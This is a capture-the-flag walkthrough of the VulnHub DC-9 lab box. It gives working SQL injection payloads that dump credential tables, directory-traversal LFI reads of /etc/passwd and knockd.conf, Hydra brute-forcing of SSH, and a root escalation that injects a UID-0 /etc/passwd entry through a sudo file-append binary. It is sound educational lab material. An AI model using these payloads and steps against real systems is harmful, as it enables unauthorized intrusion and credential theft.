# DC-9 (VulnHub) Walkthrough

**Target:** DC-9 (10.0.2.12, DHCP-assigned on NAT Network — reconfirmed via `sudo nmap -sn 10.0.2.0/24`)  
**Attacker:** Kali Linux (10.0.2.3)

## Recon

Ping sweep to find the current IP:

```
sudo nmap -sn 10.0.2.0/24
```

DC-9 was up at 10.0.2.12. Full port scan next:

```
nmap -sC -sV -p- dc-9
```

Only one useful port: `80/tcp` (Apache 2.4.38), serving a "Staff Details" application. Port `22/tcp` came back `filtered` rather than `closed` — that distinction mattered later, since it's the signature of a port-knock daemon guarding SSH rather than the service being genuinely absent.

The homepage linked four pages: `index.php`, `display.php`, `search.php`, and `manage.php`. `manage.php` looked like the admin area; `search.php` looked like the injection target.

## Finding the SQL Injection

`search.php`'s form posts to `results.php` with a single field, `search`. A baseline query for the letter "a" returned "0 results" — clean starting point.

```
curl -s -X POST http://dc-9/results.php -d "search=a' or 1=1-- -"
```

17 staff records came back instead of 0. The `search` value is clearly being concatenated straight into a `WHERE` clause without sanitisation — closing the quote and appending `OR 1=1` turned the condition into something always-true.

I tried `ORDER BY` first to find the column count, but that was a dead end here — none of the 17 staff names actually end in "a", so a 0-result response could mean either "no match" or "silently suppressed SQL error," and the app doesn't surface DB errors on the page. Switched to `UNION SELECT` with recognisable placeholder numbers instead, using a search term guaranteed to match nothing real:

```
curl -s -X POST http://dc-9/results.php -d "search=zzz' UNION SELECT 1,2,3,4,5,6-- -"
```

Five columns failed silently; six worked, rendering `1`/`2 3`/`4`/`5`/`6` in the ID/Name/Position/Phone/Email slots. Column mapping: 1=ID, 2=firstname, 3=lastname, 4=position, 5=phone, 6=email.

## Dumping Credentials

With `information_schema.tables`, I listed every table across every database visible to the current DB user, since I didn't know the schema name yet:

```
curl -s -X POST http://dc-9/results.php -d "search=zzz' UNION SELECT 1,group_concat(table_schema,0x3a,table_name),3,4,5,6 FROM information_schema.tables WHERE table_schema != 'information_schema'-- -"
```

Three tables, two databases: `Staff.StaffDetails`, `Staff.Users`, and `users.UserDetails` — a separate database entirely, which turned out to hold a second, unrelated set of credentials.

Dumped `Staff.Users` first — the web login table:

```
curl -s -X POST http://dc-9/results.php -d "search=zzz' UNION SELECT 1,group_concat(Username,0x3a,Password SEPARATOR 0x0a),3,4,5,6 FROM Staff.Users-- -"
```

`admin:856f5de590ef37314e7c3bdf6f8a66dc` — a raw MD5 hash. `john --format=raw-md5` against plain rockyou.txt got 0 cracked; adding `--rules` (leetspeak substitutions, appended digits, capitalisation variants) found it: **admin / transorbital1**.

## Admin Panel LFI

Logged into `manage.php` as admin. Every authenticated page's footer showed **"File does not exist"** — a strong tell that something was trying to `include()` a file based on a request parameter and failing when none was supplied. Testing `file=` on `manage.php` and `addrecord.php` did nothing; the actual vulnerable endpoint turned out to be `welcome.php`, requiring a directory-traversal prefix even for an absolute-looking path (the app does some naive filtering that relative traversal bypasses):

```
curl -s -b "PHPSESSID=<session>" "http://dc-9/welcome.php?file=../../../../../../../etc/passwd"
```

Full `/etc/passwd` came back in the footer — confirmed LFI, and it cross-referenced neatly with the 17 staff records: every staff member has a matching local Linux account.

## Port Knocking

Since SSH showed as `filtered`, I used the same LFI to read the knock daemon's config:

```
curl -s -b "PHPSESSID=<session>" "http://dc-9/welcome.php?file=../../../../../../../etc/knockd.conf"
```

Knock sequence to open SSH: `7469, 8475, 9842` (and `9842, 8475, 7469` to close it again). `knockd` sits watching for SYN packets to those three ports in that exact order within a 25-second window, then fires an `iptables -I INPUT` rule whitelisting the source IP on port 22 — which is exactly why nmap called the port `filtered` rather than `closed`: nothing rejects the connection outright, it's just not accepted until the firewall rule exists.

```
knock 10.0.2.12 7469 8475 9842
nmap -p22 10.0.2.12
```

SSH opened.

## SSH Credential Attack

I still needed a valid SSH login. Back to SQLi — `users.UserDetails` was the second database found earlier:

```
curl -s -X POST http://dc-9/results.php -d "search=zzz' UNION SELECT 1,group_concat(username,0x3a,password SEPARATOR 0x0a),3,4,5,6 FROM users.UserDetails-- -"
```

17 plaintext username:password pairs — but the pairings looked scrambled (`janitor:Ilovepeepee`, `chandlerb:UrAG0D!` — not obviously self-consistent). Rather than assume the listed password belonged to its listed username, I cross-tested every password against every username with Hydra:

```
hydra -L sshuser.txt -P sshpass.txt ssh://10.0.2.12 -t 4
```

Three valid logins: `chandlerb / UrAG0D!`, `joeyt / Passw0rd`, `janitor / Ilovepeepee` — confirming the scramble theory.

## Lateral Movement

SSH'd in as `janitor` and found an odd directory in the home folder:

```
ssh janitor@10.0.2.12
ls -la .secrets-for-putin/
cat .secrets-for-putin/passwords-found-on-post-it-notes.txt
```

Three more candidate passwords: `P0Lic#10-4`, `B4-Tru3-001`, `4uGU5T-NiGHts`. Added them to the password list and re-ran Hydra:

```
hydra -L sshuser.txt -P sshpass.txt ssh://10.0.2.12 -t 4
```

New hit: **fredf / B4-Tru3-001**.

## Privilege Escalation

SSH'd in as fredf and checked sudo rights immediately:

```
ssh fredf@10.0.2.12
sudo -l
```

`(root) NOPASSWD: /opt/devstuff/dist/test/test`. The binary itself was a compiled PyInstaller executable, not worth reversing — but the uncompiled source sat right next to it:

```
cat /opt/devstuff/test.py
```

A generic file-append utility: reads `argv[1]` in full and appends it to `argv[2]`. Since `sudo` runs it as root, it can append to files fredf has no write access to — including `/etc/passwd`.

I built a malicious passwd-format line defining a new UID-0 account:

```
openssl passwd -1 -salt hax hax123
echo 'hax:$1$hax$aZ.5CrVAlYEbhtB.CVLLb/:0:0:root:/root:/bin/bash' > /tmp/newuser
sudo /opt/devstuff/dist/test/test /tmp/newuser /etc/passwd
```

Then switched to it:

```
su hax
id
```

`uid=0(root) gid=0(root) groups=0(root)` — root.

## Capturing the Flag

```
find / -iname '*flag*' 2>/dev/null
cat /root/theflag.txt
```

ASCII-art "NICE WORK!!!" message, with a note that DC-9 is the final box in the official DC series. Root confirmed, flag captured.

## Summary

| Stage | Technique |
|---|---|
| Recon | Full-port Nmap scan — SSH filtered (knockd), Apache open |
| Finding the SQLi | Unsanitised `search` POST parameter on `results.php` |
| Credential Dump | `information_schema` enumeration → `Staff.Users` → MD5 hash → cracked with `john --rules` (`transorbital1`) |
| LFI | `welcome.php?file=` with directory traversal, discovered via a persistent "File does not exist" footer clue |
| Port Knocking | LFI read of `/etc/knockd.conf` → `knock` sequence opened SSH |
| SSH Credential Attack | Second SQLi dump (`users.UserDetails`) → scrambled plaintext creds → Hydra cross-attack |
| Lateral Movement | `.secrets-for-putin/` leak as janitor → additional passwords → `fredf` |
| Privilege Escalation | Sudo NOPASSWD file-append binary abused to inject a UID-0 `/etc/passwd` entry |
| Capturing the Flag | `cat /root/theflag.txt` |
